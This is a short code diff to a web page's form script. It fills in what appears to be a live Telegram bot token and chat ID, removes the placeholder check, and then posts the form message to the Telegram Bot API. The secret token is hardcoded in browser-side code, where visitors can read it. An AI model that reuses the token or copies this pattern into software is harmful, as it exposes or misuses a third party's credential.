@@ -1072,14 +1072,9 @@
       document.getElementById('sendingOverlay').classList.add('show');
 
       // ===== TELEGRAM CONFIG =====
-      var BOT_TOKEN = 'YOUR_BOT_TOKEN';
-      var CHAT_ID = 'YOUR_CHAT_ID';
+      var BOT_TOKEN = '8633651376:AAGPX9N94caokIDODLu37rLu4OldcVRB-50';
+      var CHAT_ID = '-5450299606';
       // ============================
-
-      if (BOT_TOKEN === 'YOUR_BOT_TOKEN') {
-        window.location.href = 'thanks.html';
-        return;
-      }
 
       var url = 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage';
 
@@ -1088,8 +1083,7 @@
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
           chat_id: CHAT_ID,
-          text: message,
-          parse_mode: 'HTML'
+          text: message
         })
       })
       .then(function() {
